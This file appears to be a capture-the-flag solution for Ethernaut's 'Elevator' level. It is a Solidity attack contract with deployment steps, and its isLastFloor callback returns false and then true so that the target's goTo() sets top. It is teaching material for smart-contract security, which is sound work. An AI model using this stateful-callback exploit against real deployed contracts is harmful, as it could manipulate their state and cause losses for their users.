/*
Tools needed for this level:
- Console
- Remix IDE

1.- Copy the Elevator contract to Remix IDE. This is needed for being able to import the code 
    on this file. No need to deploy Elevator.sol.
2.- Deploy this contract (ElevatorAttack.sol) passing Ethernaut's Elevator contract address
    to the constructor.
3.- Execute the setTop function passing any floor number you like.
4.- Check current floor and if it is the top in the console:
        (await contract.floor()).toString()
        await contract.top()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
	bool public toggle = true;
	Elevator public elevator;

	constructor(address elevatorAddr) {
		elevator = Elevator(elevatorAddr);
	}

	function isLastFloor(uint256) public returns (bool) {
		// This fulfills the implementation of the isLastFloor function
		// on the Building interface inside Ethernaut's Elevator contract, which is the
		// key needed for passing this level.
		// Since the isLastFloor function on the Building interface is "external", it can
		// be called from outside that contract.
		// This function is called twice:
		// - The first time this function gets called it needs to return "false" because the
		// Ethernaut's contract is negating the boolean, meaning we want
		// "!false" which equals to "true" for passing the requirement on the goTo() function:
		//          if (!building.isLastFloor(_floor))
		// - The second time this function gets called it has to return "true"
		// for setting the top boolean as "true":
		//          top = building.isLastFloor(floor)
		toggle = !toggle;
		return toggle;
	}

	// Execute the goTo() function if Ethernaut's Elevator contract.
	function setTop(uint256 _floor) public {
		elevator.goTo(_floor);
	}
}
